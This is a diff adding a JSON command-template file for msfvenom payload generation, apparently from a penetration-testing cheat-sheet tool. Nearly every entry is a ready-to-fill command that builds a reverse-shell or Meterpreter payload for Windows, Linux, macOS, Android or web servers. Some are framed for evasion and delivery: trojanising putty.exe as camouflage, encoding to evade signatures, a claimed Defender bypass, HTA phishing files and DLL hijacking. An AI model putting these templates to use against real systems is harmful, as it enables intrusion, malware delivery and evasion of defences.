@@ -1,0 +1,521 @@
+{
+  "title": "Metasploit - Payload Generation (msfvenom)",
+  "commands": [
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows x64 Meterpreter reverse TCP (stageless)",
+      "description": "Single binary with full meterpreter. Bigger file size, but no staged download. Good for air-gapped targets.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows x86 Meterpreter reverse TCP (staged)",
+      "description": "Small stager downloads the rest of meterpreter in stages. Small file size, requires second stage connection.",
+      "template": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows x86 Meterpreter reverse TCP (stageless)",
+      "description": "Full meterpreter in a single x86 binary. No second stage needed.",
+      "template": "msfvenom -p windows/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "443"
+        }
+      ],
+      "title": "Windows x64 Meterpreter reverse HTTPS (stageless)",
+      "description": "Encrypted HTTPS communication. Harder to detect by network IDS. Stageless version.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_https LHOST={lhost_ip} LPORT={lport} -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "443"
+        }
+      ],
+      "title": "Windows x64 Meterpreter reverse HTTPS (staged)",
+      "description": "Encrypted HTTPS staged payload. Small stager then downloads the full meterpreter over SSL.",
+      "template": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost_ip} LPORT={lport} -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "80"
+        }
+      ],
+      "title": "Windows x64 Meterpreter reverse HTTP (staged)",
+      "description": "HTTP staged payload. Looks like web traffic, might bypass strict egress filtering.",
+      "template": "msfvenom -p windows/x64/meterpreter/reverse_http LHOST={lhost_ip} LPORT={lport} -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows x64 shell reverse TCP (staged)",
+      "description": "Minimal staged shell (not meterpreter). Useful for limited bandwidth or basic shell access.",
+      "template": "msfvenom -p windows/x64/shell/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f exe -o /tmp/shell.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows x64 TCP reverse + template injection (evasion)",
+      "description": "Embeds payload into putty.exe (-x). The -k flag keeps original app behavior as camouflage.",
+      "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -x /tmp/putty.exe -k -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows x86 staged + x86/xor_encoder evasion",
+      "description": "Encodes the stager with x86/xor_dynamic to evade basic signature detection.",
+      "template": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -e x86/xor_dynamic -i 3 -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "445"
+        }
+      ],
+      "title": "Windows x64 Meterpreter bind TCP (stageless)",
+      "description": "Payload binds to a port on the target and waits for you to connect. Useful when target is behind NAT and can't connect out.",
+      "template": "msfvenom -p windows/x64/meterpreter_bind_tcp LPORT={lport} -f exe -o /tmp/bind.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "53"
+        },
+        {
+          "name": "dns_host",
+          "description": "DNS zone domain",
+          "default": "your.domain.com"
+        }
+      ],
+      "title": "Windows x64 Meterpreter reverse DNS (stageless)",
+      "description": "Communicates over DNS protocol. Very stealthy but slow. Requires DNS zone configuration on your domain.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_dns LHOST={lhost_ip} LPORT={lport} DNS_ZONE={dns_host} -f exe -o /tmp/dns.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Linux x64 Meterpreter reverse TCP (stageless)",
+      "description": "Full meterpreter for 64-bit Linux targets (ELF binary).",
+      "template": "msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f elf -o /tmp/payload.elf"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Linux x64 shell reverse TCP",
+      "description": "Simple shell (no meterpreter) for Linux x64. Lighter weight, good for quick access.",
+      "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f elf -o /tmp/shell.elf"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Linux x86 staged meterpreter",
+      "description": "Staged meterpreter for 32-bit Linux systems.",
+      "template": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f elf -o /tmp/payload.elf"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Linux Bash one-liner",
+      "description": "Outputs a bash one-liner command string (not a file). Copy-paste directly into a shell.",
+      "template": "msfvenom -p cmd/unix/reverse_bash LHOST={lhost_ip} LPORT={lport}"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "macOS x64 Meterpreter reverse TCP (stageless)",
+      "description": "Macho binary for 64-bit macOS targets.",
+      "template": "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f macho -o /tmp/payload.macho"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows PowerShell one-liner (stageless)",
+      "description": "Generates a .ps1 PowerShell script with full meterpreter embedded. Run with 'powershell -ep bypass -File payload.ps1'.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f ps1 -o /tmp/payload.ps1"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows PowerShell encoded one-liner (command line)",
+      "description": "Outputs a base64-encoded PowerShell one-liner. Uses staged payload to stay under cmdline limits.",
+      "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f psh-cmd"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows HTA payload (phishing)",
+      "description": "Generates an HTA file for phishing attacks. Uses staged payload to stay under size limits.",
+      "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f hta-psh -o /tmp/payload.hta"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows DLL payload (for DLL hijacking)",
+      "description": "Creates a DLL payload. Use for DLL hijacking, sideloading, or regsvr32 execution.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f dll -o /tmp/payload.dll"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows service EXE payload (for PSExec)",
+      "description": "Exe-service format installs as a Windows service. Uses staged payload to stay under 8192 byte limit.",
+      "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f exe-service -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows stageless x64 + avoid-fork + winrm (evasion)",
+      "description": "Uses 'Windows Defender' bypass techniques with PrependMigrate to move to a trusted process.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o /tmp/payload.exe"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Python reverse TCP (stageless)",
+      "description": "Python meterpreter script. Requires Python on target. Works cross-platform (Windows/Linux/macOS).",
+      "template": "msfvenom -p python/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -o /tmp/payload.py"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "PHP reverse TCP (stageless)",
+      "description": "PHP meterpreter script. Used against web servers running PHP.",
+      "template": "msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -o /tmp/payload.php"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "ASPX payload (IIS web shells)",
+      "description": "ASPX payload for IIS web servers. Upload to a web directory and browse to execute.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f aspx -o /tmp/payload.aspx"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Java WAR payload (Tomcat)",
+      "description": "WAR file for deploying on Java Tomcat servers. Upload to webapps directory and trigger via browser.",
+      "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f war -o /tmp/payload.war"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Android APK Meterpreter reverse TCP",
+      "description": "Android APK payload. Installs as a seemingly normal app on Android devices.",
+      "template": "msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -o /tmp/payload.apk"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows x64 raw shellcode (for injectors)",
+      "description": "Raw shellcode bytes. Use with custom shellcode loaders or injectors like Cobalt Strike execute-shellcode.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f raw -o /tmp/payload.bin"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "C reverse shell (cross-platform C code)",
+      "description": "Generates C source code with embedded shellcode. Compile with gcc/mingw for any platform.",
+      "template": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f c -o /tmp/payload.c"
+    },
+    {
+      "args": [],
+      "title": "List all available payloads",
+      "description": "Shows all payloads msfvenom can generate.",
+      "template": "msfvenom -l payloads"
+    },
+    {
+      "args": [],
+      "title": "List available output formats",
+      "description": "Shows all supported output formats (exe, dll, ps1, py, elf, raw, etc.).",
+      "template": "msfvenom -l formats"
+    },
+    {
+      "args": [],
+      "title": "List all encoders",
+      "description": "Shows all available encoders for AV evasion.",
+      "template": "msfvenom -l encoders"
+    }
+  ]
+}
